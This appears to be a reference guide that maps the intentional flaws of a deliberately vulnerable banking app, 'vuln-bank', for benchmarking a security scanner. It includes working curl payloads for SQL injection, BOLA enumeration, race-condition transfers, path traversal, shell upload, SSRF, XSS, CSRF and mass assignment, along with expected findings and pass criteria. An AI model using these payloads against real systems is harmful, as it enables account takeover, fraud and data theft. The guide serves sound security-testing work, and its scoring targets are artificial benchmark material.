# vuln-bank Vulnerability Map

Reference guide for OdinForge validation against vuln-bank's 30+ intentional vulnerabilities.

## Quick Test Matrix

| Endpoint | Vulnerability | Method | Expected Discovery |
|----------|---------------|--------|-------------------|
| `/api/login` | SQL Injection | POST `username' OR '1'='1` | âœ… SQLi detection |
| `/api/transfer` | Race Condition | Parallel POST requests | âœ… Race condition flagging |
| `/api/account/{id}` | BOLA (ID 1,2,3...) | GET with different IDs | âœ… BOLA detection |
| `/api/card/{id}/update-limit` | Mass Assignment | POST with extra fields | âœ… Mass assignment flagging |
| `/profile/picture` | Path Traversal | POST `../../etc/passwd` | âœ… Path traversal detection |
| `/profile/picture?image_url=...` | SSRF | URL to `http://localhost:8000` | âœ… SSRF detection |
| `/api/biller/{id}` | BOPLA (field access) | GET to access billing details | âœ… Property-level auth bypass |
| `/api/transfer?amount=-100` | Negative Amount | Negative value transfer | âœ… Business logic violation |
| `/search?q=<img src=x>` | Stored XSS | Stored in search history | âœ… XSS detection |
| `/api/card/details` | Info Disclosure | Response contains full PAN | âœ… Sensitive data exposure |

---

## Authentication & Authorization Vulnerabilities

### 1. SQL Injection in Login
**Location:** `POST /api/login`
```bash
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "anything"}'
```
**Expected:** OdinForge detects SQL injection, confirms with test payloads
**Severity:** CRITICAL

### 2. Broken Object Level Authorization (BOLA)
**Location:** `GET /api/account/{id}`
```bash
# Login as user 1, then access user 2's account
curl http://localhost:5000/api/account/2 \
  -H "Authorization: Bearer TOKEN_FOR_USER_1"
```
**Expected:** OdinForge discovers sequential ID enumeration, BOLA
**Severity:** CRITICAL

### 3. Weak JWT Implementation
**Location:** JWT token in responses
```bash
# JWT secrets are predictable/weak
# Look for: HS256 algorithm, weak secret, no expiration
```
**Expected:** OdinForge detects weak JWT, suggests brute force feasibility
**Severity:** HIGH

### 4. Weak Password Reset (3-Digit PIN)
**Location:** `POST /api/reset-password`
```bash
# PIN is only 3 digits (000-999)
# Brute-force possible in <1 second
```
**Expected:** OdinForge identifies weak reset mechanism
**Severity:** HIGH

---

## Data Security Vulnerabilities

### 5. Information Disclosure
**Location:** Multiple endpoints
- `/api/account` returns plaintext passwords
- Error messages expose database schema
- Debug endpoints leak internal state

**Expected:** OdinForge flags all sensitive field exposure
**Severity:** HIGH

### 6. Plaintext Password Storage
**Location:** Database
```bash
# Passwords stored as plaintext, not hashed
```
**Expected:** OdinForge flag if it can access DB or sees plaintext in responses
**Severity:** CRITICAL

### 7. Token Stored in localStorage
**Location:** Client-side (XSS vector)
```bash
# JWT visible in browser console
# Also vulnerable to XSS attacks
```
**Expected:** OdinForge notes combined risk (XSS + token theft)
**Severity:** HIGH

---

## Transaction Vulnerabilities

### 8. Race Condition in Transfers
**Location:** `POST /api/transfer`
```bash
# Send 2+ concurrent requests with insufficient balance
# Both may succeed due to TOCTOU (time-of-check/time-of-use)

for i in {1..5}; do
  curl -X POST http://localhost:5000/api/transfer \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"to": "user2", "amount": 1000}' &
done
wait
```
**Expected:** OdinForge detects parallel requests, timing vulnerabilities
**Severity:** HIGH

### 9. Negative Amount Transfer
**Location:** `POST /api/transfer`
```bash
curl -X POST http://localhost:5000/api/transfer \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"to": "user2", "amount": -1000}'
```
**Expected:** OdinForge identifies business logic violation
**Severity:** MEDIUM

### 10. No Transaction Limits
**Location:** `POST /api/transfer`
```bash
# Transfer unlimited amounts in single transaction
# No daily/monthly caps
```
**Expected:** OdinForge notes absence of control
**Severity:** MEDIUM

### 11. Transaction History Disclosure
**Location:** `GET /api/transactions`
```bash
# Any user can see all transactions with BOLA
```
**Expected:** Combined with BOLA detection
**Severity:** HIGH

---

## File Operation Vulnerabilities

### 12. Unrestricted File Upload
**Location:** `POST /profile/picture`
```bash
# Upload .php, .exe, .sh with no validation
curl -F "file=@shell.php" http://localhost:5000/upload
```
**Expected:** OdinForge detects lack of file type validation
**Severity:** CRITICAL

### 13. Path Traversal in Upload
**Location:** `POST /profile/picture?filename=...`
```bash
# Use ../ to write outside upload directory
curl -F "filename=../../etc/passwd" \
     -F "file=@malicious.txt" \
     http://localhost:5000/upload
```
**Expected:** OdinForge detects path traversal, unsafe file naming
**Severity:** CRITICAL

### 14. Server-Side Request Forgery (SSRF)
**Location:** `POST /profile/picture?image_url=...`
```bash
# Pass URL to internal service
curl -X POST http://localhost:5000/profile/picture \
  -d "image_url=http://localhost:8000/admin" \
  -H "Authorization: Bearer TOKEN"
```
**Expected:** OdinForge detects SSRF potential, internal URL access
**Severity:** HIGH

### 15. No File Size Limits
**Location:** `/upload`
```bash
# Upload multi-GB files causing DoS
```
**Expected:** OdinForge notes lack of file size validation
**Severity:** MEDIUM

---

## Session Management & Web Vulnerabilities

### 16. Cross-Site Scripting (XSS)
**Location:** Multiple input fields
```bash
# Stored XSS in transaction notes, profile, etc.
curl -X POST http://localhost:5000/api/transfer \
  -d "notes=<img src=x onerror='alert(1)'>"

# Reflected XSS in search
curl http://localhost:5000/search?q=<script>alert(1)</script>
```
**Expected:** OdinForge discovers multiple XSS vectors
**Severity:** HIGH

### 17. Cross-Site Request Forgery (CSRF)
**Location:** State-changing endpoints
```html
<!-- No CSRF token validation -->
<form action="http://localhost:5000/api/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="9999">
</form>
```
**Expected:** OdinForge notes absence of CSRF protection
**Severity:** MEDIUM

### 18. No Session Expiration
**Location:** JWT tokens
```bash
# Tokens never expire or have very long expiration
```
**Expected:** OdinForge flags indefinite session validity
**Severity:** MEDIUM

---

## Virtual Card Vulnerabilities

### 19. Mass Assignment in Card Updates
**Location:** `PUT /api/card/{id}/update-limit`
```bash
curl -X PUT http://localhost:5000/api/card/123/update-limit \
  -H "Authorization: Bearer TOKEN" \
  -d '{"limit": 5000, "is_active": true, "is_admin": true}'
  # is_admin not intended to be user-updatable
```
**Expected:** OdinForge detects mass assignment, field injection
**Severity:** HIGH

### 20. Predictable Card Numbers
**Location:** Card generation logic
```bash
# Card numbers sequential: 1000000001, 1000000002, etc.
# Easy to enumerate and brute-force
```
**Expected:** OdinForge identifies pattern predictability
**Severity:** MEDIUM

### 21. BOLA on Card Operations
**Location:** `GET /api/card/{id}`
```bash
# Access other users' card details by guessing ID
curl http://localhost:5000/api/card/999 \
  -H "Authorization: Bearer TOKEN_FOR_USER_1"
```
**Expected:** Combined with BOLA detection strategy
**Severity:** CRITICAL

### 22. Plaintext Card Storage
**Location:** Database/responses
```bash
# Full PAN/CVV returned in API responses
```
**Expected:** OdinForge flags sensitive data exposure
**Severity:** CRITICAL

---

## Bill Payment Vulnerabilities

### 23. SQL Injection in Biller Queries
**Location:** `GET /api/biller/{name}`
```bash
curl "http://localhost:5000/api/biller/water' OR '1'='1"
```
**Expected:** OdinForge detects SQL injection in dynamic queries
**Severity:** CRITICAL

### 24. Information Disclosure in Payment History
**Location:** `GET /api/bill-payments`
```bash
# Returns other users' payment history
```
**Expected:** Combined with BOLA/authorization checks
**Severity:** HIGH

### 25. No Validation on Payment Amounts
**Location:** `POST /api/bill-payment`
```bash
# Negative amounts, zero amounts accepted
```
**Expected:** OdinForge flags business logic violations
**Severity:** MEDIUM

---

## Testing Workflow in OdinForge

1. **Recon Phase (5 mins)**
   - Discover endpoints
   - Identify parameter types
   - Detect technologies

2. **Exploit Phase (10 mins)**
   - SQLi validation (5 endpoints)
   - BOLA/BOPLA enumeration (3+ endpoints)
   - Path traversal testing
   - Race condition detection
   - XSS payloads

3. **Business Logic Phase (5 mins)**
   - Negative transfers
   - Unlimited amounts
   - Race conditions in balance

4. **Breach Chain Phase (5 mins)**
   - Login SQLi â†’ Access other accounts
   - File upload â†’ RCE (if applicable)
   - Card BOLA â†’ Mass transfer
   - Password reset brute force â†’ Account takeover

5. **Scoring & Reporting (2 mins)**
   - Generate SARIF
   - Calculate CVSS/EPSS
   - Identify critical chain

---

## Expected OdinForge Report

**Total Findings:** 24-30
**Critical:** 8-10
**High:** 12-14
**Medium:** 4-6
**Low:** 0-2

**Breach Chains Detected:** 3-5
- SQL Injection (Login) â†’ BOLA (Account Access)
- File Upload â†’ Path Traversal â†’ RCE
- Card BOLA â†’ Mass Assignment â†’ Unlimited Balance
- Password Reset (weak) â†’ Account Takeover

---

## Benchmark Success Criteria

âœ… **Minimum Pass:**
- Discovers >20 findings
- <5% false positives
- Detects â‰¥2 exploit chains
- <5 minutes total scan time

ðŸŽ¯ **Excellent:**
- Discovers >25 findings
- <2% false positives
- Detects â‰¥3 exploit chains
- Provides remediation guidance
- Exports valid SARIF

ðŸ† **Outstanding:**
- Discovers all 30 vulnerabilities
- <1% false positives
- Detects â‰¥5 exploit chains
- Includes evidence HTTP traces
- Rates severity accurately with CVSS
